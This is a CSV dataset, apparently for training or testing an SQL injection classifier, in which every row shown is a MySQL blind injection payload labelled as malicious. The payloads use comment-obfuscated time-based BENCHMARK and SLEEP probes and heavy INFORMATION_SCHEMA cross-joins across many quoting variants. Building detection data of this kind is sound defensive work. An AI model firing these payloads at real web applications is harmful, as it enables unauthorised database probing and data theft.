input_text,Label,classification, ,,,,,,
"'/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))--/**/yrDY",1,Yes,,,,,,,
"')/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))--/**/clpI",1,Yes,,,,,,,
")/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))--/**/ZXdb",1,Yes,,,,,,,
"'/**/IN/**/BOOLEAN/**/MODE)/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)#",1,Yes,,,,,,,
"]-(SELECT/**/0/**/WHERE/**/4703=4703/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1))|[",1,Yes,,,,,,,
"""=""""/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/""""=""",1,Yes,,,,,,,
"`=``/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/``=`",1,Yes,,,,,,,
"`)/**/WHERE/**/2470=2470/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/OUCu",1,Yes.,,,,,,,
"`/**/WHERE/**/4898=4898/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/ZhiQ",1,Yes.,,,,,,,
")/**/AS/**/bnse/**/WHERE/**/6584=6584/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/prFA",1,Yes,,,,,,,
""")/**/AS/**/dxQs/**/WHERE/**/6195=6195/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/MiMj",1,Yes,,,,,,,
"')/**/AS/**/KQZg/**/WHERE/**/7768=7768/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/wcsO",1,Yes,,,,,,,
"))/**/AS/**/lOud/**/WHERE/**/3219=3219/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/Xtiy",1,Yes,,,,,,,
"""))/**/AS/**/bioR/**/WHERE/**/6530=6530/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/NhSr",1,Yes,,,,,,,
"'))/**/AS/**/uRbf/**/WHERE/**/9650=9650/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/TCHt",1,Yes,,,,,,,
"+(SELECT/**/0x57745a47/**/WHERE/**/3801=3801/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1))+",1,Yes,,,,,,,
"+(SELECT/**/PncX/**/WHERE/**/9765=9765/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1))+",1,Yes,,,,,,,
"||(SELECT/**/0x78456463/**/WHERE/**/3618=3618/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1))||",1,Yes,,,,,,,
"||(SELECT/**/0x67654b6e/**/FROM/**/DUAL/**/WHERE/**/4037=4037/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1))||",1,Yes,,,,,,,
"'+(SELECT/**/0x72426374/**/WHERE/**/7444=7444/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1))+'",1,Yes,,,,,,,
"'||(SELECT/**/0x4a4c5553/**/FROM/**/DUAL/**/WHERE/**/6847=6847/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1))||'",1,Yes,,,,,,,
"'||(SELECT/**/0x484b6949/**/WHERE/**/7921=7921/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1))||'",1,Yes,,,,,,,
"/**/WHERE/**/6681=6681/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/KmdM",1,Yes,,,,,,,
"""/**/WHERE/**/6609=6609/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/Wirf",1,Yes,,,,,,,
"'/**/WHERE/**/4433=4433/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/IVnR",1,Yes.,,,,,,,
")/**/WHERE/**/2565=2565/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/gMhI",1,Yes,,,,,,,
""")/**/WHERE/**/9224=9224/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/WoAW",1,Yes,,,,,,,
"')/**/WHERE/**/3295=3295/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/aKPU",1,Yes,,,,,,,
"'/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/OR/**/'rcEQ'='sOIZ",1,Yes,,,,,,,
"/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)#/**/YgEg",1,Yes,,,,,,,
"/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/HtIE",1,Yes,,,,,,,
"""/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/""wxpd""/**/LIKE/**/""wxpd",1,Yes.,,,,,,,
""")))/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/(((""SguZ""/**/LIKE/**/""SguZ",1,Yes,,,,,,,
"""))/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/((""irRu""/**/LIKE/**/""irRu",1,Yes,,,,,,,
""")/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/(""xPGx""/**/LIKE/**/""xPGx",1,Yes,,,,,,,
"""/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/""gwNA""=""gwNA",1,Yes,,,,,,,
""")))/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/(((""MCem""=""MCem",1,Yes,,,,,,,
"""))/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/((""qsNz""=""qsNz",1,Yes.,,,,,,,
""")/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/(""pmIA""=""pmIA",1,Yes,,,,,,,
"'/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/'Itpj'/**/LIKE/**/'Itpj",1,Yes,,,,,,,
"%'/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/'cFCv%'='cFCv",1,Yes.,,,,,,,
"')))/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/((('GGIy'/**/LIKE/**/'GGIy",1,Yes,,,,,,,
"'))/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/(('CMcz'/**/LIKE/**/'CMcz",1,Yes.,,,,,,,
"')/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/('GYEv'/**/LIKE/**/'GYEv",1,Yes,,,,,,,
"'/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/'Ggqd'='Ggqd",1,Yes.,,,,,,,
"')))/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/((('PInd'='PInd",1,Yes,,,,,,,
"'))/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/(('UGJV'='UGJV",1,Yes,,,,,,,
"')/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/('YpVb'='YpVb",1,Yes,,,,,,,
"/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)",1,Yes,,,,,,,
")))/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/(((2753=2753",1,Yes,,,,,,,
"))/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/((6312=6312",1,Yes,,,,,,,
")/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/(5639=5639",1,Yes,,,,,,,
"""/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/uYtV",1,Yes.,,,,,,,
"'/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/HCXw",1,Yes.,,,,,,,
"')/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/nNad",1,Yes,,,,,,,
")/**/AND/**/2916=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/AywN",1,Yes.,,,,,,,
"'/**/IN/**/BOOLEAN/**/MODE)/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))#",1,Yes.,,,,,,,
"]-(SELECT/**/0/**/WHERE/**/5857=5857/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871)))|[",1,Yes.,,,,,,,
"""=""""/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/""""=""",1,Yes,,,,,,,
"`=``/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/``=`",1,Yes.,,,,,,,
"`)/**/WHERE/**/1085=1085/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))--/**/UJcr",1,Yes.,,,,,,,
"`/**/WHERE/**/8634=8634/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))--/**/KZZM",1,Yes,,,,,,,
")/**/AS/**/lDdG/**/WHERE/**/4620=4620/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))--/**/HkCt",1,Yes.,,,,,,,
""")/**/AS/**/YmIL/**/WHERE/**/9481=9481/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))--/**/SSSh",1,Yes,,,,,,,
"')/**/AS/**/SQgR/**/WHERE/**/7662=7662/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))--/**/roCe",1,Yes,,,,,,,
"))/**/AS/**/atbF/**/WHERE/**/6422=6422/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))--/**/FMzy",1,Yes,,,,,,,
"""))/**/AS/**/sOGE/**/WHERE/**/1978=1978/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))--/**/azrU",1,Yes.,,,,,,,
"'))/**/AS/**/pasb/**/WHERE/**/9864=9864/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))--/**/ShdL",1,Yes.,,,,,,,
"+(SELECT/**/0x78735a4e/**/WHERE/**/6024=6024/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871)))+",1,Yes.,,,,,,,
"+(SELECT/**/LIOm/**/WHERE/**/1401=1401/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871)))+",1,Yes.,,,,,,,
"||(SELECT/**/0x4a425144/**/WHERE/**/1461=1461/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871)))||",1,Yes.,,,,,,,
"||(SELECT/**/0x42735056/**/FROM/**/DUAL/**/WHERE/**/9086=9086/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871)))||",1,Yes,,,,,,,
"'+(SELECT/**/0x70497242/**/WHERE/**/6082=6082/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871)))+'",1,Yes.,,,,,,,
"'||(SELECT/**/0x4d67466e/**/FROM/**/DUAL/**/WHERE/**/1177=1177/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871)))||'",1,Yes.,,,,,,,
"'||(SELECT/**/0x69536945/**/WHERE/**/6221=6221/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871)))||'",1,Yes,,,,,,,
"/**/WHERE/**/7760=7760/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))--/**/firc",1,Yes.,,,,,,,
"""/**/WHERE/**/2036=2036/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))--/**/ptEy",1,Yes.,,,,,,,
"'/**/WHERE/**/3754=3754/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))--/**/ozAm",1,Yes,,,,,,,
")/**/WHERE/**/2801=2801/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))--/**/Pwcf",1,Yes,,,,,,,
""")/**/WHERE/**/7000=7000/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))--/**/mwpy",1,Yes.,,,,,,,
"')/**/WHERE/**/9474=9474/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))--/**/EYrx",1,Yes,,,,,,,
"'/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/OR/**/'lyFW'='weKd",1,Yes.,,,,,,,
"/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))#/**/NmzS",1,Yes,,,,,,,
"/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))--/**/KZtu",1,Yes.,,,,,,,
"""/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/""aJXR""/**/LIKE/**/""aJXR",1,Yes.,,,,,,,
""")))/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/(((""SWcy""/**/LIKE/**/""SWcy",1,Yes,,,,,,,
"""))/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/((""quSo""/**/LIKE/**/""quSo",1,Yes.,,,,,,,
""")/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/(""YTtd""/**/LIKE/**/""YTtd",1,Yes.,,,,,,,
"""/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/""JGSF""=""JGSF",1,Yes.,,,,,,,
""")))/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/(((""TliL""=""TliL",1,Yes,,,,,,,
"""))/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/((""lUwm""=""lUwm",1,Yes.,,,,,,,
""")/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/(""Qftj""=""Qftj",1,Yes.,,,,,,,
"'/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/'Dvrh'/**/LIKE/**/'Dvrh",1,Yes,,,,,,,
"%'/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/'hLyD%'='hLyD",1,Yes,,,,,,,
"')))/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/((('dYoW'/**/LIKE/**/'dYoW",1,Yes,,,,,,,
"'))/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/(('uKGU'/**/LIKE/**/'uKGU",1,Yes.,,,,,,,
"')/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/('FqDY'/**/LIKE/**/'FqDY",1,Yes.,,,,,,,
"'/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/'MVMR'='MVMR",1,Yes.,,,,,,,
"')))/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/((('ZhhP'='ZhhP",1,Yes.,,,,,,,
"'))/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/(('Shyz'='Shyz",1,Yes,,,,,,,
"')/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/('WGIJ'='WGIJ",1,Yes.,,,,,,,
"/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))",1,Yes.,,,,,,,
")))/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/(((4586=4586",1,Yes,,,,,,,
"))/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/((8789=8789",1,Yes,,,,,,,
")/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))/**/AND/**/(4070=4070",1,Yes,,,,,,,
"""/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))--/**/dKbF",1,Yes,,,,,,,
"'/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))--/**/etua",1,Yes,,,,,,,
"')/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))--/**/QbXm",1,Yes,,,,,,,
")/**/AND/**/5216=BENCHMARK(5000000,MD5(0x63796871))--/**/HeKZ",1,Yes,,,,,,,
`)/**/WHERE/**/8719=8719/**/OR/**/(SELECT/**/1132/**/FROM/**/(SELECT(SLEEP(5)))qKxg)#,1,Yes.,,,,,,,
`/**/WHERE/**/3549=3549/**/OR/**/(SELECT/**/1132/**/FROM/**/(SELECT(SLEEP(5)))qKxg)#,1,Yes.,,,,,,,
)/**/AS/**/LIio/**/WHERE/**/7859=7859/**/OR/**/(SELECT/**/1132/**/FROM/**/(SELECT(SLEEP(5)))qKxg)#,1,Yes,,,,,,,
""")/**/AS/**/wYJx/**/WHERE/**/7972=7972/**/OR/**/(SELECT/**/1132/**/FROM/**/(SELECT(SLEEP(5)))qKxg)#",1,Yes.,,,,,,,
')/**/AS/**/vePT/**/WHERE/**/2079=2079/**/OR/**/(SELECT/**/1132/**/FROM/**/(SELECT(SLEEP(5)))qKxg)#,1,Yes.,,,,,,,
))/**/AS/**/BtEQ/**/WHERE/**/8351=8351/**/OR/**/(SELECT/**/1132/**/FROM/**/(SELECT(SLEEP(5)))qKxg)#,1,Yes.,,,,,,,
